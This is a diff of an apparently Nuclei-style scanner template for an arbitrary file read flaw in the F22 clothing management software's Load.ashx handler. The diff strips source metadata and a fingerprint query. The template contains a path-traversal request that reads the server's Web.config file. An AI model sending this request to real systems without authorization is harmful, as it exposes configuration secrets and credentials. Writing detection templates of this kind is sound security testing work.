@@ -3,12 +3,8 @@ info:
   name: F22服装管理软件系统 Load.ashx 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xvta4hegw3dncbpm'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xvta4hegw3dncbpm
-    fofa: body="b28web/Utility/"
 http:
 - raw:
   - 'GET /CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../Web.config HTTP/1.1
@@ -23,9 +19,7 @@ http:
 
     Accept-Language: zh-CN,zh;q=0.9
 
-    Connection: keep-alive
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730351422194-76d50e04-1d86-42f9-a530-1d67a5a2e541.png)'
+    Connection: keep-alive'
   redirects: false
   matchers:
   - status:
